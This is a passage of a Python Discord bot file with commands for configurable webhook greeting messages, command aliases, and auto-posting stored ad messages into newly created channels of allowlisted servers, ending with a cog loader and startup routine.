            embed_title = format_field(guild_data.get("embed_title", ""))
            embed_footer = format_field(guild_data.get("embed_footer", ""))
            embed_color = int(guild_data.get("embed_color", "#ffffff").lstrip("#"), 16)
            embed_image = format_field(guild_data.get("embed_image", ""))
            embed_thumbnail = format_field(guild_data.get("embed_thumbnail", ""))
            webhook_name = format_field(guild_data.get("webhook_name", member.guild.name))
            webhook_avatar = format_field(guild_data.get("webhook_avatar", ""))
            user_mention = guild_data.get("user_mention", True)

            for channel_id in guild_data.get("channel_ids", []):
                channel = self.bot.get_channel(int(channel_id))
                if not channel:
                    continue

                webhook = await channel.create_webhook(name=webhook_name)
                try:
                    if embed_status:
                        embed = discord.Embed(title=embed_title, description=greeting_message, color=embed_color)
                        if embed_footer:
                            embed.set_footer(text=embed_footer)
                        if embed_image:
                            embed.set_image(url=embed_image)
                        if embed_thumbnail:
                            embed.set_thumbnail(url=embed_thumbnail)
                        if user_mention == True:
                            await webhook.send(member.mention,embed=embed, username=webhook_name, avatar_url=webhook_avatar or None)
                        else:
                            await webhook.send(embed=embed, username=webhook_name, avatar_url=webhook_avatar or None)

                    else:
                        await webhook.send(content=greeting_message, username=webhook_name, avatar_url=webhook_avatar or None)
                finally:
                    await webhook.delete()

        except Exception as e:
            print(f"[ERROR] on_member_join failed: {e}")

                            
    @commands.command(aliases=["setgreet","setgmsg"])
    async def setgreetmsg(self,ctx):
        await ctx.message.delete()
        ask_msg = await send(
            ctx,
            "Greet Message",
            "Please send the greeting message you want to set. You can use the following placeholders:\n\n>>> ```"
            "{username} - User's username\n"
            "{mention} - User mention\n"
            "{servername} - Server name\n"
            "{time} - current time\n"
            "{date} - current date\n"
            "{membercount} - Total members\n"
            "{usercount} - Total users count (non-bot)\n"
            "{userplace} - User position (like: 4th , 5th)\n"
            "{usercreated} - Acc created date\n"
            "{servericon} - Server icon (url)\n"
            "{useravatar} - User avatar (url)\n```"
            "```\n\nExample: ```Welcome {username} to {servername}! You are the {userplace} member to join!```"
        )

        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            msg = await self.bot.wait_for('message', check=check, timeout=300)
            greeting_message = msg.content
            with open("database/greets.json", "r") as f:
                data = json.load(f)
                if str(ctx.guild.id) not in data:
                    data[str(ctx.guild.id)] = {
                        "greeting_message": "",
                        "channel_ids": [],
                        "embed_status": True,
                        "embed_color": "#FF0000",
                        "embed_title": "Welcome to {servername}",
                        "embed_footer": "Joined : {time} : {date}",
                        "embed_image": "",
                        "embed_thumbnail": "",
                        "webhook_name": "{servername}",
                        "webhook_avatar": "{servericon}"
                    }
                else:
                    data[str(ctx.guild.id)]["greeting_message"] = greeting_message
                with open("database/greets.json", "w") as f:
                    json.dump(data, f, indent=4)
            await msg.delete()
            await ask_msg.delete()
            await  send(ctx,"Success","Greeting message set successfully!")
        except Exception as e:
            await senderror(ctx,"Error",e)
            
    @commands.command(aliases=["setgreetchannel","addgchannel","addgch"])
    async def addgreetchannel(self,ctx,channel:discord.TextChannel=None):
        await ctx.message.delete()
        channel = channel or ctx.channel
        with open("database/greets.json", "r") as f:
            data = json.load(f)
            if str(ctx.guild.id) not in data:
                data[str(ctx.guild.id)] = {
                    "greeting_message": "",
                    "channel_ids": [str(channel.id)],
                    "embed_status": True,
                    "embed_color": "#FF0000",
                    "embed_title": "Welcome to {servername}",
                    "embed_footer": "Joined : {time} : {date}",
                    "embed_image": "",
                    "embed_thumbnail": "",
                    "webhook_name": "{servername}",
                    "webhook_avatar": "{servericon}"
                }
            else:
                if str(channel.id) not in data[str(ctx.guild.id)]["channel_ids"]:
                    data[str(ctx.guild.id)]["channel_ids"].append(channel.id)
            with open("database/greets.json", "w") as f:
                json.dump(data, f, indent=4)
        await send(ctx,"Success","Greeting channel added successfully!")

    @commands.command(aliases=["delgreetchannel","delgch",'remgch'])
    async def removegreetchannel(self,ctx,channel:discord.TextChannel=None):
        await ctx.message.delete()
        channel = channel or ctx.channel
        with open("database/greets.json", "r") as f:
            data = json.load(f)
            if str(ctx.guild.id) not in data:
                return await send(ctx,"Error","No greeting channels found.")
            else:
                if str(channel.id) in data[str(ctx.guild.id)]["channel_ids"]:
                    data[str(ctx.guild.id)]["channel_ids"].remove(channel.id)
                    with open("database/greets.json", "w") as f:
                        json.dump(data, f, indent=4)
                    await send(ctx,"Success","Greeting channel removed successfully!")
                else:
                    await send(ctx,"Error","This channel is not a greeting channel.")

    @commands.command(aliases=["gembed","greetembed"])
    async def greetembedstatus(self,ctx,status:bool=None):
        await ctx.message.delete()
        with open("database/greets.json", "r") as f:
            data = json.load(f)
            if status is None:
                return await send(ctx,"Error","Please specify a status (True/False).")
            data[str(ctx.guild.id)]["embed_status"] = status
            with open("database/greets.json", "w") as f:
                json.dump(data, f, indent=4)
            await send(ctx,"Success",f"Greeting embed status updated to `{status}` successfully!")                
    
    @commands.command(aliases=["gtitle","greettitle"])
    async def greetembedtitle(self,ctx,*title):
        await ctx.message.delete()
        title = " ".join(title)
        with open("database/greets.json", "r") as f:
            data = json.load(f)
            data[str(ctx.guild.id)]["embed_title"] = title
            with open("database/greets.json", "w") as f:
                json.dump(data, f, indent=4)
            await send(ctx,"Success",f"Greeting embed title updated to `{title}` successfully!")

    @commands.command(aliases=["gfooter","greetfooter"])
    async def greetembedfooter(self,ctx,*footer):
        await ctx.message.delete()
        footer = " ".join(footer)
        with open("database/greets.json", "r") as f:
            data = json.load(f)
            data[str(ctx.guild.id)]["embed_footer"] = footer
            with open("database/greets.json", "w") as f:
                json.dump(data, f, indent=4)
            await send(ctx,"Success",f"Greeting embed footer updated to `{footer}` successfully!")

    @commands.command(aliases=["gcolor","gcolour","greetcolor","greetcolour"])
    async def greetembedcolor(self,ctx,color): 
        await ctx.message.delete()
        if color is None:
            return await send(ctx,"Error","Please specify a color in hex format (e.g. #FF0000).")
        if not color.startswith("#") or len(color) != 7:
            return await send(ctx,"Error","Please specify a valid hex color code (e.g. #FF0000).")
        with open("database/greets.json", "r") as f:
            data = json.load(f)
            data[str(ctx.guild.id)]["embed_color"] = color
            with open("database/greets.json", "w") as f:
                json.dump(data, f, indent=4)
            await send(ctx,"Success",f"Greeting embed color updated to `{color}` successfully!")     
        
    @commands.command(aliases=["greetimage"])
    async def greetembedimage(self,ctx,url_or_placeholder):
        await ctx.message.delete()
        with open("database/greets.json", "r") as f:
            data = json.load(f)
            data[str(ctx.guild.id)]["embed_image"] = url_or_placeholder
            with open("database/greets.json", "w") as f:
                json.dump(data, f, indent=4)
            await send(ctx,"Success",f"Greeting embed image updated to `{url_or_placeholder}` successfully!")

    @commands.command(aliases=["gthumbnail","greetthumbnail"])
    async def greetembedthumbnail(self,ctx,url_or_placeholder):
        await ctx.message.delete()
        with open("database/greets.json", "r") as f:
            data = json.load(f)
            data[str(ctx.guild.id)]["embed_thumbnail"] = url_or_placeholder
            with open("database/greets.json", "w") as f:
                json.dump(data, f, indent=4)
            await send(ctx,"Success",f"Greeting embed thumbnail updated to `{url_or_placeholder}` successfully!")

    @commands.command(aliases=["gwname","gwhookname","gwebname"])
    async def greetwebhookname(self,ctx,*name):
        await ctx.message.delete()
        name = " ".join(name)
        with open("database/greets.json", "r") as f:
            data = json.load(f)
            data[str(ctx.guild.id)]["webhook_name"] = name
            with open("database/greets.json", "w") as f:
                json.dump(data, f, indent=4)
            await send(ctx,"Success",f"Greeting webhook name updated to `{name}` successfully!")

    @commands.command(aliases=["gwavatar","gwhookavatar","gwava","gwhookava",'gwebavatar'])
    async def greetwebhookavatar(self,ctx,url_or_placeholder):
        await ctx.message.delete()
        with open("database/greets.json", "r") as f:
            data = json.load(f)
            data[str(ctx.guild.id)]["webhook_avatar"] = url_or_placeholder
            with open("database/greets.json", "w") as f:
                json.dump(data, f, indent=4)
            await send(ctx,"Success",f"Greeting webhook avatar updated to `{url_or_placeholder}` successfully!")

    @commands.command(aliases=['gtest','testg','testgreet'])
    async def greettest(self,ctx):
        with open("database/greets.json", "r") as f:
            data = json.load(f)
        guild_id = str(ctx.guild.id)
        if guild_id not in data:
            return await ctx.send("❌ Greet system is not set up for this server.")
        guild_data = data[guild_id]
        channel_ids = guild_data.get("channel_ids", [])
        if not channel_ids:
            return await ctx.send("⚠️ No greet channels are set in the configuration.")        
        await self.on_member_join(ctx.author)
        await ctx.message.add_reaction("✅")
        await ctx.message.delete(delay=30)

    @commands.command(aliases=['umention','gusermention'])
    async def usermention(self,ctx,status:bool=None):
        await ctx.message.delete()
        with open("database/greets.json", "r") as f:
            data = json.load(f)
            if status is None:
                return await send(ctx,"Error","Please specify a status (True/False).")
            data[str(ctx.guild.id)]["user_mention"] = status
            with open("database/greets.json", "w") as f:
                json.dump(data, f, indent=4)
            await send(ctx,"Success",f"Embed user mention status updated to `{status}` successfully!")                
    

    @commands.command()
    async def greet(self, ctx):
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<:discord:1554757014406823988> **`[REQUIRED] | <OPTIONAL>`** <a:staff:1554757404972032060>\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<a:Welcome:1554765197976277063> | **Set greeting message** **:** **`{prefix}setgreetmsg`**\n"
            f"<a:Welcome:1554765197976277063> | **Add greeting channel** **:** **`{prefix}addgch [channel]`**\n"
            f"<a:Welcome:1554765197976277063> | **Remove greeting channel** **:** **`{prefix}remgch [channel]`**\n"
            f"<a:Welcome:1554765197976277063> | **Sreet embed status** **:** **`{prefix}gembed [true|false]`**\n"
            f"<a:Welcome:1554765197976277063> | **Set embed title** **:** **`{prefix}gtitle [text]`**\n"
            f"<a:Welcome:1554765197976277063> | **Set embed footer** **:** **`{prefix}gfooter [text]`**\n"
            f"<a:Welcome:1554765197976277063> | **Set embed color** **:** **`{prefix}gcolor [hex colour]`**\n"
            f"<a:Welcome:1554765197976277063> | **Set embed image** **:** **`{prefix}greetimage [URL]`**\n"
            f"<a:Welcome:1554765197976277063> | **Set embed thumbnail** **:** **`{prefix}gthumbnail [URL]`**\n"
            f"<a:Welcome:1554765197976277063> | **Set webhook name** **:** **`{prefix}gwebname [name]`**\n"
            f"<a:Welcome:1554765197976277063> | **Set webhook avatar** **:** **`{prefix}gwebavatar [URL]`**\n"
            f"<a:Welcome:1554765197976277063> | **Test greeting system** **:** **`{prefix}greettest`**\n"
            f"<a:Welcome:1554765197976277063> | **Embed user mention** **:** **`{prefix}umention [true|false]`**\n"
            f"- <a:Welcome:1554765197976277063> **Some Placeholders** <a:Welcome:1554765197976277063>\n"
            "```{username} - User's username\n"
            "{mention} - User mention\n"
            "{servername} - Server name\n"
            "{time} - current time\n"
            "{date} - current date\n"
            "{membercount} - Total members\n"
            "{usercount} - Total users\n"
            "{userplace} - User position\n"
            "{usercreated} - Acc created date\n"
            "{servericon} - Server icon (url)\n"
            "{useravatar} - User avatar (url)```\n"            
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>"
        )
        await send(ctx, "<:rocket1:1554756297143095346>__Greeting Commands__<a:crown:1554756538445336626>", description)


ALIAS_FILE = "database/aliases.json"

def load_aliases():
    if os.path.exists(ALIAS_FILE):
        with open(ALIAS_FILE, "r") as f:
            return json.load(f)
    return {}

def save_aliases(data):
    with open(ALIAS_FILE, "w") as f:
        json.dump(data, f, indent=4)

class AliasCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.aliases = load_aliases()
        self.apply_aliases()
        
    def apply_aliases(self):
        for command_name, alias_list in self.aliases.items():
            original_command = self.bot.get_command(command_name)
            if original_command:
                for alias in alias_list:
                    if not self.bot.get_command(alias):
                        self.bot.add_command(commands.Command(
                            original_command.callback,
                            name=alias,
                            aliases=[] 
                        ))

    @commands.command(aliases=['alias+','aliasadd'])
    async def addalias(self, ctx, command_name: str, new_alias: str):
        command = self.bot.get_command(command_name)
        if not command:
            return await senderror(ctx, "Invalid Command", f"`{command_name}` doesn't exist.")
        if self.bot.get_command(new_alias):
            return await senderror(ctx, "Alias Exists", f"`{new_alias}` is already a command or alias.")
        if command_name not in self.aliases:
            self.aliases[command_name] = []
        if new_alias in self.aliases[command_name]:
            return await senderror(ctx, "Duplicate Alias", f"`{new_alias}` already exists for `{command_name}`.")
        self.aliases[command_name].append(new_alias)
        save_aliases(self.aliases)
        self.bot.add_command(commands.Command(
            command.callback,
            name=new_alias,
            aliases=[]
        ))
        await send(ctx, "Alias Added", f"`{new_alias}` is now an alias for `{command_name}`.")

    @commands.command(aliases=['remalias','aliasremove','aliasrem','alias-'])
    async def removealias(self, ctx, alias: str):
        found = False
        for command_name, alias_list in self.aliases.items():
            if alias in alias_list:
                alias_list.remove(alias)
                found = True
                if command := self.bot.get_command(alias):
                    self.bot.remove_command(alias)
                break

        if not found:
            return await senderror(ctx, "Alias Not Found", f"`{alias}` is not a known alias.")
        self.aliases = {cmd: als for cmd, als in self.aliases.items() if als}
        save_aliases(self.aliases)

        await send(ctx, "Alias Removed", f"`{alias}` has been removed successfully.")


ADS_FILE = "database/ads.json"

def load_ads():
    default_data = {"triggers": {}, "guilds": [], "aliases": {}}

    if not os.path.exists(ADS_FILE):
        with open(ADS_FILE, "w") as f:
            json.dump(default_data, f, indent=4)
        return default_data

    try:
        with open(ADS_FILE, "r") as f:
            data = json.load(f)
    except json.JSONDecodeError:
        data = default_data

    for key in default_data:
        if key not in data:
            data[key] = default_data[key]

    save_ads(data) 
    return data


def save_ads(data):
    with open(ADS_FILE, "w") as f:
        json.dump(data, f, indent=4)

class AutoAdvertise(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.ads = load_ads()

    @commands.command()
    async def autoad(self, ctx):
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<:discord:1554757014406823988> **`[REQUIRED] | <OPTIONAL>`** <a:staff:1554757404972032060>\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<a:shop:1554765835862679582> | **Add AutoAD** **:** **`{prefix}autoad+ [trigger] [msg]`**\n"
            f"<a:shop:1554765835862679582> | **Remove AutoAD** **:** **`{prefix}autoad- [trigger]`**\n"            
            f"<a:shop:1554765835862679582> | **Whitelist guilds** **:** **`{prefix}adguild+ [ID]`**\n"  
            f"<a:shop:1554765835862679582> | **Unwhitelist guilds** **:** **`{prefix}adguild- [ID]`**\n"
            f"<a:shop:1554765835862679582> | **AD Alias** **:** **`{prefix}adalias+ [trigger] [alias]`**\n"            
            f"<a:shop:1554765835862679582> | **Remove AD Alias** **:** **`{prefix}adalias- [alias]`**\n"                        
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>"
        )
        await send(ctx, "<:rocket1:1554756297143095346>__Auto ADs Commands__<a:crown:1554756538445336626>", description)
    @commands.command(aliases=['autoad+'])
    async def autoadadd(self, ctx, trigger: str, *, message: str):
        await ctx.message.delete()
        if trigger in self.ads["triggers"]:
            return await senderror(ctx, "Already Exists", f"Trigger `{trigger}` already has a message.")
        self.ads["triggers"][trigger] = message
        save_ads(self.ads)
        await send(ctx, "Ad Added", f"Trigger `{trigger}` now responds with:\n```\n{message}\n```")

    @commands.command(aliases=['autoad-'])
    async def autoadrem(self, ctx, trigger: str):
        await ctx.message.delete()        
        if trigger not in self.ads["triggers"]:
            return await senderror(ctx, "Not Found", f"No ad exists with trigger `{trigger}`.")
        del self.ads["triggers"][trigger]
        self.ads["aliases"] = {k: v for k, v in self.ads["aliases"].items() if v != trigger}
        save_ads(self.ads)
        await send(ctx, "Ad Removed", f"Trigger `{trigger}` removed.")

    @commands.command(aliases=["adguild+", "guildadd"])
    async def adguildadd(self, ctx, guild_id: int):
        await ctx.message.delete()        
        if guild_id in self.ads["guilds"]:
            return await senderror(ctx, "Already Exists", f"Guild `{guild_id}` is already added.")
        self.ads["guilds"].append(guild_id)
        save_ads(self.ads)
        await send(ctx, "Guild Added", f"Guild `{guild_id}` added to the allowlist.")

    @commands.command(aliases=["delguild","remguild",'adguild-'])
    async def adguildrem(self, ctx, guild_id: int):
        await ctx.message.delete()        
        if guild_id not in self.ads["guilds"]:
            return await senderror(ctx, "Not Found", f"Guild `{guild_id}` is not in the list.")
        self.ads["guilds"].remove(guild_id)
        save_ads(self.ads)
        await send(ctx, "Guild Removed", f"Guild `{guild_id}` removed from the allowlist.")

    @commands.command(aliases=['adalias+','aliasad+'])
    async def adaliasadd(self, ctx, trigger: str, alias: str):
        await ctx.message.delete()        
        if trigger not in self.ads["triggers"]:
            return await senderror(ctx, "Invalid Trigger", f"Trigger `{trigger}` doesn't exist.")
        self.ads["aliases"][alias] = trigger
        save_ads(self.ads)
        await send(ctx, "Alias Added", f"Alias `{alias}` will now trigger ad `{trigger}`.")

    @commands.command(aliases=["aliasdel", "removead", "adalias-"])
    async def adaliasrem(self, ctx, alias: str):
        await ctx.message.delete()        
        if alias not in self.ads["aliases"]:
            return await senderror(ctx, "Alias Not Found", f"`{alias}` is not an existing alias.")
        del self.ads["aliases"][alias]
        save_ads(self.ads)
        await send(ctx, "Alias Removed", f"Alias `{alias}` removed.")

    @commands.Cog.listener()
    async def on_guild_channel_create(self, channel):
        if not isinstance(channel, discord.TextChannel):
            return
        if channel.guild.id not in self.ads["guilds"]:
            return

        channel_name = channel.name
        real_trigger = None

        if channel_name in self.ads["triggers"]:
            real_trigger = channel_name
        elif channel_name in self.ads["aliases"]:
            real_trigger = self.ads["aliases"][channel_name]

        if real_trigger:
            message = self.ads["triggers"].get(real_trigger)
            try:
                await channel.send(message)
            except:
                pass


modules = [ServerCog,fun,images, mod, alts, nsfw,text, wizz, crypto, Wallet, check,settings, gc, vc, other,Boost,Giveaway,Joiner,AntiNuke,Greet,AliasCog,AutoAdvertise]   

async def load_cogs():
    for cog_class in modules:
        cog = cog_class(mag)
        await mag.add_cog(cog)
    await mag.load_extension('additional.extra')

async def main():     
    await load_cogs()
    try:
        print(f"DEBUG: discord version: {discord.__version__}")
        print(f"DEBUG: discord file: {discord.__file__}")
        await mag.start(token)
    except Exception as e:
        print(f"\n[CRITICAL ERROR] Failed to login: {e}")
        input("Press Enter to exit...")

if __name__ == "__main__":
    asyncio.run(main())